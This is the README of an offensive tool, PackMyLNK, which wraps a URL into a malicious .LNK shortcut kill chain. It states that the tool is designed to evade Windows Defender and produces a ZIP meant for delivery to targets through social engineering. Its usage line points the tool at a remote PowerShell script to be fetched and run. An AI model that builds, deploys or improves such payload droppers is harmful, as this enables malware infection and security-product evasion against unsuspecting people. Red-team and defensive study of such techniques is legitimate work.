# PackMyLNK

This tool takes a URL as input and embeds it into a classic kill chain using .LNK files. I designed it with the specific intent of avoiding detection by Windows Defender. It generates a final ZIP file, ready to be delivered to the target using Social Engineering techniques.

## Usage
`.\PackMyLNK.exe -Url http://example.com/RunMe.ps1`
